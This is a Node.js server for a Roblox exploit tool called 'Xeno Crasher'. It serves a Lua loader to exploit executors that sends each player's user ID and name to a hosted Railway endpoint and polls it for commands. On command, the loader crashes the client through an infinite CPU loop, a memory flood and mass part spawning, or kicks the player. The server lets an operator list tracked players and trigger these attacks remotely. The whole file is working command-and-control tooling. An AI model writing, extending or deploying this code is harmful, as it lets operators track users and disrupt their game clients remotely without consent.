const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// ✅ FIXED: Use your actual Railway URL
// ============================================
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT - Served to Roblox clients
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher Client ]]--
local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

-- ============================================
-- ✅ FIXED: Better HTTP detection
-- ============================================
local function resolveRequest()
    local functions = {
        syn and syn.request,
        request,
        http and http.request,
        http_request,
        fluxus and fluxus.request,
        getgenv and getgenv().request,
        function(url, options)
            return game:GetService("HttpService"):PostAsync(
                url,
                options.Body or "",
                Enum.HttpContentType.ApplicationJson
            )
        end
    }
    
    for _, func in ipairs(functions) do
        if type(func) == "function" then
            return func
        end
    end
    return nil
end

local request = resolveRequest()
if not request then
    error("❌ No HTTP function found! Your executor may not be supported.")
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

-- ============================================
-- ✅ FIXED: GUI Creation (shows on screen)
-- ============================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 200, 0, 60)
    frame.Position = UDim2.new(0.5, -100, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = "✅ Connected to Xeno Crasher"
    label.TextColor3 = Color3.fromRGB(0, 255, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 16
    label.Parent = frame
    
    return screenGui
end

-- ============================================
-- HEARTBEAT - Sends data to server
-- ============================================
local function heartbeat()
    safe(function()
        local success = pcall(function()
            return request({
                Url = BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId,
                    username = LP.Name,
                    display_name = LP.DisplayName,
                    executor = "XenoClient",
                    online = true
                }),
            })
        end)
        if success then
            print("✅ Heartbeat sent successfully!")
        else
            warn("⚠️ Heartbeat failed")
        end
    end)
end

-- ============================================
-- POLL - Checks for commands from website
-- ============================================
local function poll()
    safe(function()
        local res = request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
        
        if res and res.Body then
            local data = HttpService:JSONDecode(res.Body)
            
            -- 🔥 CRASH COMMAND
            if data.crash == true then
                print("💥 CRASH COMMAND RECEIVED!")
                -- Method 1: Infinite loop
                task.spawn(function()
                    while true do
                        local x = 0
                        for i = 1, 1000000 do
                            x = x + i
                        end
                    end
                end)
                -- Method 2: Memory overload
                task.spawn(function()
                    local huge = {}
                    for i = 1, 1000000 do
                        huge[i] = string.rep("X", 10000)
                    end
                end)
                -- Method 3: Spam parts
                task.spawn(function()
                    for i = 1, 5000 do
                        local p = Instance.new("Part")
                        p.Size = Vector3.new(100, 100, 100)
                        p.Parent = workspace
                        p.Position = Vector3.new(
                            math.random(-1000, 1000),
                            math.random(-1000, 1000),
                            math.random(-1000, 1000)
                        )
                        task.wait()
                    end
                end)
            end
            
            -- KICK COMMAND
            if data.kick == true then
                print("👢 KICK COMMAND RECEIVED!")
                LP:Kick("You have been removed from the game.")
            end
        end
    end)
end

-- ============================================
-- START THE SCRIPT
-- ============================================
createGUI()
heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)

print("✅ Xeno Crasher loaded successfully!");
print("🔗 Connected to: " .. BASE);
`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// API ENDPOINTS
// ============================================

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now()
    });
    
    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    
    res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    
    const response = {};
    
    if (p._crash) {
        response.crash = true;
        p._crash = false;
        console.log(`💥 CRASH DELIVERED TO: ${p.username || userId}`);
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
        console.log(`👢 KICK DELIVERED TO: ${p.username || userId}`);
    }
    
    players.set(String(userId), p);
    res.json(response);
});

// ============================================
// SERVE FRONTEND
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
